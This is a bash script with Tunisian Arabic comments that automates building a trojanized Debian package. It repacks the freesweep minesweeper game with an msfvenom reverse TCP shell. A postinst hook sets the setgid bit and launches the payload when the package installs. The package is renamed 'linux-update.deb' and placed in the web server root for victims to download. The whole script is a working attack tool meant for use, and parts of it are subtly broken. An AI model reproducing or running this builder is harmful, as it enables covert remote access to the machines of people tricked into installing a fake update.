#!/bin/bash
#
# Na7itlik partie deb wa7adHa [bhstalel] gift to OBA <3
# El code mawjoud mais matal9ashy automatique hakka
# El idee bel "freesweep"
# El code m9asmou 7asb 32 wela 64 , w 7asb freesweep installé ou nn
#

IP=$(ip route get 1 | awk '{print $NF;exit}') # IP local
VERSION=$(uname -m) # version mte3 linux 32 / 64

installed32(){
sleep 3
echo "[+] Processing ..! "
mkdir /tmp/evil
cp /var/cache/apt/archives/freesweep_0.90-1_i386.deb /tmp/evil
cd /tmp/evil/
dpkg -x freesweep_0.90-1_i386.deb work
mkdir work/DEBIAN
cd /work/DEBIAN
touch control
echo "Package: freesweep
Version: 0.90-1
Section: Games and Amusement
Priority: optional
Architecture: i386
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: a text-based minesweeper
 Freesweep is an implementation of the popular minesweeper game, where
 one tries to find all the mines without igniting any, based on hints given
 by the computer. Unlike most implementations of this game, Freesweep
 works in any visual text display - in Linux console, in an xterm, and in
 most text-based terminals currently in use." > control
 touch postinst
 echo "#!/bin/sh
sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep &" > postinst
echo
sleep 3
echo "[+] Generating payload: "
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST="$IP" LPORT=443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
echo
sleep 3
echo "[+] Continuing process ..!"
sleep 3
chmod 755 postinst
mv work.deb linux-update.deb
cp linux-update.deb /var/www/
# Hetheya lien elli fih scama linux mte3y
#wget http://download1640.mediafire.com/0xu2p4y06kfg/1ws05k16f2b78ko/linux-update.sh
chmod +x linux-update.sh
./linux-update.sh
}

notinstalled32(){
sleep 3
echo "[+] Downloading ~freesweep~ ..! "
apt-get --download-only install freesweep
echo
sleep 3
echo "[+] Processing ..! "
mkdir /tmp/evil
cp /var/cache/apt/archives/freesweep_0.90-1_i386.deb /tmp/evil
cd /tmp/evil/
dpkg -x freesweep_0.90-1_i386.deb work
mkdir work/DEBIAN
cd /work/DEBIAN
touch control
echo "Package: freesweep
Version: 0.90-1
Section: Games and Amusement
Priority: optional
Architecture: i386
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: a text-based minesweeper
 Freesweep is an implementation of the popular minesweeper game, where
 one tries to find all the mines without igniting any, based on hints given
 by the computer. Unlike most implementations of this game, Freesweep
 works in any visual text display - in Linux console, in an xterm, and in
 most text-based terminals currently in use." > control
 touch postinst
 echo "#!/bin/sh
sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep &" > postinst
echo
sleep 3
echo "[+] Generating payload: "
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST="$IP" LPORT=443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
echo
sleep 3
echo "[+] Continuing process ..!"
sleep 3
chmod 755 postinst
mv work.deb linux-update.deb
cp linux-update.deb /var/www/
#wget http://download1640.mediafire.com/0xu2p4y06kfg/1ws05k16f2b78ko/linux-update.sh
chmod +x linux-update.sh
./linux-update.sh
}

installed64(){
sleep 1
echo "[+] Processing ..! "
echo "[+] Making /tmp/evil folder ..!"
mkdir /tmp/evil
sleep 3
echo "[+] Mooving freesweep ..!"
cp /var/cache/apt/archives/freesweep_0.90-3_amd64.deb /tmp/evil
sleep 3
cd /tmp/evil/
echo "[+] Installing ..!"
mkdir work
dpkg -x freesweep_0.90-3_amd64.deb work
sleep 3
cd work
mkdir DEBIAN
cd DEBIAN
echo "[+] Making control file ..!"
touch control
echo "Package: freesweep
Version: 0.90-1
Section: Games and Amusement
Priority: optional
Architecture: i386
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: a text-based minesweeper
 Freesweep is an implementation of the popular minesweeper game, where
 one tries to find all the mines without igniting any, based on hints given
 by the computer. Unlike most implementations of this game, Freesweep
 works in any visual text display - in Linux console, in an xterm, and in
 most text-based terminals currently in use." > control
 sleep 3
 echo "[+] Making postinst file ..!"
 touch postinst
 echo "#!/bin/sh
sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep &" > postinst
echo
sleep 3
echo "[+] Generating payload: "
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST="$IP" LPORT=443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
echo
sleep 3
echo "[+] Continuing process ..!"
sleep 3
echo "[+] Giving permissions ..!"
chmod 755 postinst
echo "[+] Creating deb file ..!"
dpkg-deb --build /tmp/evil/work
sleep 2
cd ../..
mv work.deb linux-update.deb
cp linux-update.deb /var/www/html
cd /var/www/html
sleep 3
}

notinstalled64(){
sleep 1
echo "[+] Downloading ~freesweep~ ..! "
apt-get --download-only install freesweep
echo
sleep 3
echo "[+] Processing ..! "
echo "[+] Making /tmp/evil folder ..!"
mkdir /tmp/evil
sleep 3
echo "[+] Mooving freesweep ..!"
cp /var/cache/apt/archives/freesweep_0.90-3_amd64.deb /tmp/evil
sleep 3
cd /tmp/evil/
echo "[+] Installing ..!"
mkdir work
dpkg -x freesweep_0.90-3_amd64.deb work
sleep 3
cd work
mkdir DEBIAN
cd DEBIAN
echo "[+] Making control file ..!"
touch control
echo "Package: freesweep
Version: 0.90-1
Section: Games and Amusement
Priority: optional
Architecture: i386
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: a text-based minesweeper
 Freesweep is an implementation of the popular minesweeper game, where
 one tries to find all the mines without igniting any, based on hints given
 by the computer. Unlike most implementations of this game, Freesweep
 works in any visual text display - in Linux console, in an xterm, and in
 most text-based terminals currently in use." > control
 sleep 3
 echo "[+] Making postinst file ..!"
 touch postinst
 echo "#!/bin/sh
sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /usr/games/freesweep &" > postinst
echo
sleep 3
echo "[+] Generating payload: "
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST="$IP" LPORT=443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
echo
sleep 3
echo "[+] Continuing process ..!"
sleep 3
echo "[+] Giving permissions ..!"
chmod 755 postinst
echo "[+] Creating deb file ..!"
dpkg-deb --build /tmp/evil/work
sleep 2
cd ../..
mv work.deb linux-update.deb
cp linux-update.deb /var/www/html
cd /var/www/html
sleep 3
}

testsweep64(){
if [ -e /var/cache/apt/archives/freesweep*.deb ]; then
installed64
else
notinstalled64
fi
}

testsweep32(){
if [ -e /var/cache/apt/archives/freesweep*.deb ]; then
installed32
else
notinstalled32
fi
}

_32linpay(){
testsweep32
}

_64linpay(){
testsweep64
}

payforlinux(){
clear
sleep 2
echo " +=================================+"
echo " | s3rialback (bhstalel@gmail.com) |"
echo " | Important:                      |"
echo " | Making .deb payload [Be Happy]  |"
echo " *=================================+"
echo
sleep 1
echo "[+] Your are using ""$VERSION"" version !"
read -p "Run? (y/n): " run
case $run in
  "n") exit;;
esac
sleep 3
if [ "$VERSION" == "x86_64" ]; then
	_64linpay
else
	_32linpay
fi
}

globalmenu() {
  clear
  echo "DEB PAYLOAD [hetha zedtou tawa besh tefhem les fonctions;]"
  payforlinux
}
globalmenu
